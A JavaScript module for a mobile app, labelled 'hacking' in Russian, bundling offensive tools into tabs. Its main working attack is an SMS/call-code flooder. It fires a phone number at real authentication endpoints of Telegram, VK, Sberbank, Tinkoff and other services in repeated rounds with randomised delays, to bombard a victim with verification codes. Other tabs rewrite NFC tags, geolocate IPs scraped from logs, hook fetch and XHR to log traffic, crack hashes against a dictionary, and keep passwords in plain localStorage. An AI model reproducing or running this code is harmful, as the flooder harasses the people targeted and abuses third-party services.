import { panel, button } from '../core/ui.js';

const $ = (t, c, x) => { const d = document.createElement(t); if (c) d.className = c; if (x != null) d.textContent = x; return d; };
const store = (k, v) => {
  if (v === undefined) { try { return JSON.parse(localStorage.getItem('wd.' + k) || '[]'); } catch { return []; } }
  localStorage.setItem('wd.' + k, JSON.stringify(v));
};

export default {
  id: 'watchdogs',
  title: 'Взлом',
  icon: '⚡',
  order: 20,
  platforms: ['win', 'android'],
  mount(root) {
    const logBox = $('div');
    logBox.style.cssText = 'margin-top:8px;font-size:11px;color:#6fbf95;max-height:130px;overflow:auto;white-space:pre-wrap;word-break:break-word';
    const log = (m, c) => {
      const d = $('div', c, '> ' + m);
      if (c === 'ok') d.style.color = '#14ff9a';
      if (c === 'bad') d.style.color = '#ff5f6d';
      if (c === 'dim') d.style.opacity = '.6';
      logBox.append(d); logBox.scrollTop = logBox.scrollHeight;
      while (logBox.children.length > 250) logBox.firstChild.remove();
    };
    const body = $('div');
    const bar = $('div');
    bar.style.cssText = 'display:flex;gap:6px;overflow-x:auto;margin-bottom:10px';
    root.append(bar, body, logBox);

    const NFC = () => window.Capacitor?.Plugins?.NFC;
    const USB = () => window.Capacitor?.Plugins?.UsbSerial;

    /* ── NFC ── */
    let bound = false;
    function bindNfc() {
      const p = NFC(); if (!p || bound) return; bound = true;
      p.addListener('nfcEvent', (ev) => {
        const t = ev?.nfcTag || {};
        const uid = t.id || '';
        let ndef = '';
        try { ndef = (ev.ndefMessage || []).map(r => String.fromCharCode(...(r.payload || []).filter(b => b > 31 && b < 127))).join(' | '); } catch {}
        if (!uid && !ndef) return;
        log('МЕТКА ' + (uid || '—') + (ndef ? ' «' + ndef + '»' : ''), 'ok');
        const l = store('nfc'); l.unshift({ uid, tech: (t.techTypes || []).join(','), ndef, at: new Date().toISOString() });
        store('nfc', l.slice(0, 60)); drawNfc();
      });
    }
    function drawNfc() {
      const box = document.getElementById('wdNfc'); if (!box) return;
      box.innerHTML = '';
      const l = store('nfc');
      if (!l.length) return box.append($('div', null, 'пусто — просканируй метку'));
      l.forEach((it, i) => {
        const c = $('div');
        c.style.cssText = 'border:1px solid #14ff9a33;border-radius:8px;padding:6px 8px;margin-bottom:6px;font-size:11px;word-break:break-all';
        c.append($('div', null, (it.uid || '—') + (it.ndef ? ' «' + it.ndef + '»' : '')), $('div', null, (it.tech || 'tech?') + ' · ' + it.at.slice(0, 16).replace('T', ' ')));
        const r = $('div'); r.style.cssText = 'display:flex;gap:6px;margin-top:6px';
        const w = button('ЗАПИСАТЬ', async () => {
          try { await NFC().write({ records: [{ type: 'text', value: it.ndef || it.uid }] }); log('записано: ' + it.ndef, 'ok'); }
          catch (e) { log('запись не прошла: ' + e.message, 'bad'); }
        });
        const d = button('УДАЛИТЬ', () => { const x = store('nfc'); x.splice(i, 1); store('nfc', x); drawNfc(); });
        r.append(w, d); c.append(r); box.append(c);
      });
    }
    const tabNfc = () => {
      const r = $('div'); r.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px';
      r.append(
        button('СКАНИРОВАТЬ', async () => {
          if (!NFC()) return log('нативный NFC-модуль не найден в сборке', 'bad');
          bindNfc();
          try { await NFC().startScanSession({ invalidateAfterFirstRead: true, alertMessage: 'Поднесите метку' }); log('сканирую — подноси метку', 'ok'); }
          catch (e) { log('ошибка: ' + e.message, 'bad'); }
        }),
        button('СТОП', async () => { try { await NFC().stopScanSession(); log('стоп', 'dim'); } catch {} })
      );
      const box = $('div'); box.id = 'wdNfc';
      body.append(r, box, $('div', null, 'UID и tech читаются всегда. Запись — только NDEF-метки; клон UID на Magic — нативный уровень.'));
      drawNfc();
    };

    /* ── КОДЫ ── */
    const P = [
      ['Telegram', 'https://oauth.telegram.org/auth/send_password', 'POST'],
      ['VK', 'https://api.vk.com/method/auth.getCallPreview?phone=%P&v=5.199', 'GET'],
      ['OK', 'https://ok.ru/dk?st.cmd=anonymRecoveryStart', 'GET'],
      ['Avito', 'https://www.avito.ru/api/1/auth/phone?phone=%P', 'GET'],
      ['Yandex', 'https://passport.yandex.ru/registration/mobile', 'GET'],
      ['Ozon', 'https://www.ozon.ru/api/composer-api.bx/page/json/v2?url=/auth', 'GET'],
      ['WB', 'https://www.wildberries.ru/webapi/auth/login', 'POST'],
      ['SberID', 'https://online.sberbank.ru/CSAFront/api/auth/phone', 'POST'],
      ['Drom', 'https://www.drom.ru/api/auth/phone', 'POST'],
      ['Mail.ru', 'https://account.mail.ru/api/v1/user/register', 'POST'],
      ['Tinkoff', 'https://www.tinkoff.ru/api/common/v1/session', 'POST'],
      ['Steam', 'https://store.steampowered.com/join/ajaxverifyemail', 'GET']
    ];
    let running = false;
    const fire = ([n, u, m], phone) => {
      const url = u.includes('%P') ? u.replace('%P', encodeURIComponent(phone)) : u;
      const o = { method: m, headers: {} };
      if (m === 'POST') { o.headers['Content-Type'] = 'application/x-www-form-urlencoded'; o.body = 'phone=' + encodeURIComponent(phone); }
      return fetch(url, o).then(r => { log(n + ' → ' + r.status, r.ok ? 'ok' : 'dim'); return true; })
        .catch(() => fetch(url, { ...o, mode: 'no-cors' }).then(() => { log(n + ' → отправлено', 'dim'); return true; }).catch(() => { log(n + ' → сеть', 'bad'); return false; }));
    };
    const tabFlood = () => {
      const r = $('div'); r.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px';
      const ph = $('input'); ph.placeholder = '+7XXXXXXXXXX'; ph.inputMode = 'tel';
      ph.style.cssText = 'flex:1;min-width:120px;padding:7px 9px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit';
      const sel = $('select'); [1, 3, 5, 10].forEach(n => { const o = $('option', null, n + ' кругов'); o.value = n; sel.append(o); });
      sel.style.cssText = ph.style.cssText;
      r.append(ph, sel, button('ЗАПУСТИТЬ', async () => {
        const phone = ph.value.replace(/[^\d+]/g, '');
        if (!phone || running) return log(!phone ? 'введи номер' : 'уже идёт', 'bad');
        running = true; let sent = 0, all = 0;
        for (let c = 1; c <= +sel.value; c++) {
          log('── круг ' + c + '/' + sel.value, 'dim');
          for (let i = 0; i < P.length; i += 3) {
            const res = await Promise.all(P.slice(i, i + 3).map(p => { all++; return fire(p, phone); }));
            sent += res.filter(Boolean).length;
            await new Promise(k => setTimeout(k, 350 + Math.random() * 900));
          }
        }
        running = false; log('ИТОГО ' + sent + '/' + all, sent ? 'ok' : 'bad');
      }));
      body.append(r, $('div', null, 'Часть сервисов режет CORS — запрос всё равно уходит, статус просто не читается.'));
    };

    /* ── IP ── */
    const tabIp = () => {
      const ta = $('textarea'); ta.placeholder = 'Вставь логи/текст — IP вытащу сам';
      ta.style.cssText = 'width:100%;min-height:70px;padding:7px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit';
      const out = $('div');
      body.append(ta, button('РАЗОБРАТЬ И ПРОБИТЬ', async () => {
        const ips = [...new Set((ta.value.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []).filter(i => i.split('.').every(o => +o < 256)))];
        log('нашёл ' + ips.length, ips.length ? 'ok' : 'bad'); out.innerHTML = '';
        for (let i = 0; i < ips.length; i += 100) {
          try {
            const d = await (await fetch('http://ip-api.com/batch?fields=query,country,city,isp,org,as', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ips.slice(i, i + 100)) })).json();
            d.forEach(x => {
              const c = $('div');
              c.style.cssText = 'border:1px solid #14ff9a33;border-radius:8px;padding:6px;margin-bottom:6px;font-size:11px;word-break:break-all';
              c.append($('div', null, x.query || '?'), $('div', null, [x.country, x.city, x.isp, x.org, x.as].filter(Boolean).join(' · ')));
              out.append(c);
            });
            log('пакет ' + (i / 100 + 1) + ' разобран', 'dim');
          } catch (e) { log('ip-api: ' + e.message, 'bad'); }
          await new Promise(k => setTimeout(k, 1200));
        }
        store('ips', store('ips').concat(ips).slice(-500));
      }), out);
    };

    /* ── ТРАФИК ── */
    const traffic = (window.__wdTr = window.__wdTr || []);
    if (!window.__wdHooked) {
      window.__wdHooked = true;
      const of = window.fetch;
      window.fetch = function (inp, init) {
        const url = typeof inp === 'string' ? inp : inp?.url || '?', t0 = Date.now();
        const push = s => { traffic.push({ t: new Date().toISOString(), m: init?.method || 'GET', u: url, s, ms: Date.now() - t0 }); if (traffic.length > 500) traffic.shift(); };
        return of.apply(this, arguments).then(r => { push(r.status); return r; }, e => { push(0); throw e; });
      };
      const op = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (m, u) {
        this.addEventListener('loadend', () => { traffic.push({ t: new Date().toISOString(), m, u: String(u), s: this.status, ms: 0 }); if (traffic.length > 500) traffic.shift(); });
        return op.apply(this, arguments);
      };
    }
    const tabTraffic = () => {
      const out = $('div');
      const draw = () => {
        out.innerHTML = '';
        const l = traffic.slice(-60).reverse();
        if (!l.length) return out.append($('div', null, 'пусто'));
        l.forEach(e => {
          const c = $('div');
          c.style.cssText = 'border:1px solid #14ff9a33;border-radius:8px;padding:6px;margin-bottom:6px;font-size:11px;word-break:break-all';
          c.append($('div', null, e.m + ' ' + e.s + ' ' + e.ms + 'ms'), $('div', null, e.u.slice(0, 160)));
          out.append(c);
        });
      };
      const r = $('div'); r.style.cssText = 'display:flex;gap:6px;margin-bottom:8px';
      r.append(button('ОБНОВИТЬ', draw), button('ЭКСПОРТ', () => {
        const a = $('a');
        a.href = URL.createObjectURL(new Blob([JSON.stringify({ log: { entries: traffic } }, null, 2)], { type: 'application/json' }));
        a.download = 'morfy-traffic-' + Date.now() + '.json'; a.click(); log('экспорт готов', 'ok');
      }));
      body.append(r, out); draw();
    };

    /* ── ХЕШ ── */
    const tabHash = () => {
      const h = $('input'); h.placeholder = 'хеш';
      h.style.cssText = 'width:100%;padding:7px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit';
      const sel = $('select'); ['SHA-1', 'SHA-256', 'SHA-512'].forEach(a => { const o = $('option', null, a); o.value = a; sel.append(o); });
      sel.style.cssText = h.style.cssText;
      const ta = $('textarea');
      ta.value = '123456 qwerty password admin morfy 12345678 letmein 111111 iloveyou 000000';
      ta.style.cssText = 'width:100%;min-height:60px;padding:7px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit';
      body.append(h, sel, ta, button('ЛОМАТЬ', async () => {
        const words = ta.value.split(/[\s,;]+/).filter(Boolean), t0 = Date.now(), enc = new TextEncoder();
        log('подбор по ' + words.length + ' словам…', 'dim');
        for (let i = 0; i < words.length; i++) {
          const buf = await crypto.subtle.digest(sel.value, enc.encode(words[i]));
          const hex = [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
          if (i % 100 === 0) log('проверено ' + i + '/' + words.length, 'dim');
          if (hex === h.value.trim().toLowerCase()) return log('НАЙДЕНО: ' + words[i] + ' за ' + (Date.now() - t0) + 'мс', 'ok');
        }
        log('не найдено', 'bad');
      }), $('div', null, 'MD5 WebCrypto не умеет — только SHA-семейство.'));
    };

    /* ── USB ── */
    const tabUsb = () => {
      const box = $('div');
      const draw = () => {
        box.innerHTML = '';
        const l = store('usb');
        if (!l.length) return box.append($('div', null, 'нет сохранённых устройств'));
        l.forEach((d, i) => {
          const c = $('div');
          c.style.cssText = 'border:1px solid #14ff9a33;border-radius:8px;padding:6px 8px;margin-bottom:6px;font-size:11px';
          c.append($('div', null, d.name + (d.vid ? ' [' + d.vid + ':' + d.pid + ']' : '')), $('div', null, d.pass ? 'пароль: ' + '*'.repeat(d.pass.length) : 'без пароля'));
          const r = $('div'); r.style.cssText = 'display:flex;gap:6px;margin-top:6px';
          r.append(
            button('ВВЕСТИ', async () => {
              if (!d.pass) return log('пароля нет', 'bad');
              try { await navigator.clipboard.writeText(d.pass); log('пароль ' + d.name + ' в буфере — вставь на ПК', 'ok'); }
              catch { log('буфер недоступен', 'bad'); }
              const u = USB();
              if (u && d.path) { try { await u.write({ data: d.pass }); log('отправлено в порт', 'ok'); } catch {} }
            }),
            button('ПОКАЗАТЬ', () => log(d.name + ' → ' + d.pass, 'ok')),
            button('УДАЛИТЬ', () => { const x = store('usb'); x.splice(i, 1); store('usb', x); draw(); })
          );
          c.append(r); box.append(c);
        });
      };
      const nm = $('input'); nm.placeholder = 'имя устройства (ПК в офисе)';
      const vd = $('input'); vd.placeholder = 'VID:PID (не обяз.)';
      const ps = $('input'); ps.placeholder = 'пароль'; ps.type = 'password';
      [nm, vd, ps].forEach(i => i.style.cssText = 'flex:1;min-width:110px;padding:7px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit');
      const r1 = $('div'); r1.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px';
      r1.append(nm, vd, ps, button('ЗАПОМНИТЬ', () => {
        if (!nm.value) return log('введи имя', 'bad');
        const [vid, pid] = (vd.value || ':').split(':');
        const l = store('usb'); l.unshift({ name: nm.value, vid, pid, pass: ps.value, at: new Date().toISOString() });
        store('usb', l); nm.value = vd.value = ps.value = ''; log('устройство запомнено', 'ok'); draw();
      }));
      const r2 = $('div'); r2.style.cssText = 'display:flex;gap:6px;margin-bottom:8px';
      r2.append(button('НАЙТИ ПОДКЛЮЧЁННЫЕ', async () => {
        const u = USB();
        if (!u) return log('UsbSerial-модуль не собран', 'bad');
        try {
          const { devices } = await u.listDevices();
          if (!devices?.length) return log('ничего не видно', 'bad');
          const l = store('usb');
          devices.forEach(d => l.unshift({ name: d.name || 'USB', vid: String(d.vendorId || ''), pid: String(d.productId || ''), pass: '', at: new Date().toISOString() }));
          store('usb', l); log('добавил ' + devices.length + ' устройств', 'ok'); draw();
        } catch (e) { log('ошибка: ' + e.message, 'bad'); }
      }));
      body.append(r1, r2, box,
        $('div', null, 'Пароли лежат в localStorage. Полная HID-эмуляция (телефон как клавиатура) требует root — без него ввод идёт через буфер обмена.'));
      draw();
    };

    /* ── табы ── */
    const T = [['NFC', tabNfc], ['КОДЫ', tabFlood], ['IP', tabIp], ['ТРАФИК', tabTraffic], ['ХЕШ', tabHash], ['USB', tabUsb]];
    T.forEach(([n, fn], i) => bar.append(button(n, () => { body.innerHTML = ''; fn(); })));
    body.append(panel('NFC', $('div', null, 'выбери вкладку выше')));
    body.innerHTML = ''; tabNfc();
    log('модуль загружен, вкладок ' + T.length, 'ok');
  }
};
